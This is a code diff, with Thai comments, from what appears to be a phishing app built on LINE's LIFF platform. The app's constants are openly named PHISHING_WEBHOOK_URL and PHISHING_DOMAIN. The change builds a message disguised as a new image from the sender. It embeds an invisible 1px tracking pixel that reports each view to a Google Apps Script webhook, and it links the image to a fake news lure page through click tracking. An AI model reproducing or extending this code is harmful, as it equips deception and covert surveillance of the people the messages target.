@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxe8LFWRRFx_VdfyjK-Eq6ikegQUMPn6qnxRBHkI9KN1RSOB1p5jJcvIPYV3kgoowdn/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxyuQl-FhQDpp1i4ks6Tnh16R0oqhtecdl3PT0hL6ZO9_DyKuqM1EvEOyrB9x0odRHv/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -880,25 +880,54 @@
                 // สร้าง URL สำหรับ Zero Click tracking (ชี้ไปที่ Apps Script เพื่อ log และ redirect)
                 // เพิ่ม random parameter เพื่อพยายามหลีกเลี่ยง cache
                 const zeroClickImageUrl = `${PHISHING_WEBHOOK_URL}?action=getImage&key=${trackingKey}&r=${generateUniqueId()}`;
-                console.log("Zero Click Image URL for Flex:", zeroClickImageUrl);
+                // สร้าง URL สำหรับ Zero Click tracking pixel
+                const trackingPixelUrl = `${PHISHING_WEBHOOK_URL}?action=trackView&key=${trackingKey}&r=${generateUniqueId()}`;
+                console.log("Tracking Pixel URL:", trackingPixelUrl);
 
-                // สร้าง Flex Message ที่มีเฉพาะรูปภาพ (ไม่มี footer)
+                // สร้าง Flex Message
                 const flexMessage = {
                     type: 'flex',
-                    altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
+                    altText: `รูปภาพใหม่จาก ${displayName}`, // ข้อความแจ้งเตือนสั้นๆ
                     contents: {
                         type: 'bubble',
                         hero: { // รูปภาพหลักที่คลิกได้
                             type: 'image',
-                            // **** ใช้ URL ที่ชี้ไปที่ Apps Script ****
-                            url: zeroClickImageUrl,
+                            // **** ใช้ URL รูปภาพโดยตรงจาก ImgBB ****
+                            url: imageUrl,
                             size: 'full',
                             aspectRatio: '1:1', // หรือปรับตามต้องการ
                             aspectMode: 'cover',
-                            action: { // ทำให้รูปภาพคลิกได้ -> ลิงก์ไปยัง index.html พร้อม tracking key
+                            action: { // ทำให้รูปภาพหลักคลิกได้ -> ลิงก์ไปยัง index.html พร้อม tracking key
                                 type: 'uri',
                                 uri: clickTrackUrl
                             }
+                        },
+                        footer: { // เพิ่ม Footer สำหรับใส่ Tracking Pixel
+                            type: 'box',
+                            layout: 'vertical',
+                            spacing: 'none',
+                            margin: 'none',
+                            contents: [
+                                {
+                                    // Tracking Pixel (Invisible)
+                                    type: 'image',
+                                    url: trackingPixelUrl, // ชี้ไปที่ Apps Script doGet?action=trackView
+                                    size: '1px', // ขนาดเล็กที่สุด
+                                    aspectRatio: '1:1',
+                                    aspectMode: 'cover', // หรือ 'fit'
+                                    margin: 'none',
+                                    // ทำให้มองไม่เห็น (อาจไม่จำเป็นถ้า size เป็น 1px)
+                                    // position: 'absolute',
+                                    // offsetTop: '0px',
+                                    // offsetStart: '0px',
+                                }
+                                // อาจจะเพิ่ม Spacer หรือข้อความเล็กๆ ถ้าต้องการให้ Footer มีเนื้อหาอื่น
+                                // {
+                                //   type: 'spacer',
+                                //   size: 'xs'
+                                // }
+                            ],
+                            paddingAll: '0px' // ไม่มี padding
                         }
                     }
                 };
